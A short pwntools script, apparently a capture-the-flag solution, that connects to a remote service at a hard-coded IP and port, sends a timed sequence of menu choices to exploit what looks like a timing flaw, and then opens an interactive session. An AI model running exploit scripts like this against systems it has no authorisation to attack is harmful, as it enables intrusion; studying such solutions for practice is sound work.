from pwn import *

r = remote("1.224.175.35", 30001)

r.sendlineafter(">> ", "1")
sleep(3)
r.sendlineafter(">> ", "3")
sleep(8)
r.sendlineafter(">> ", "2")

r.interactive()
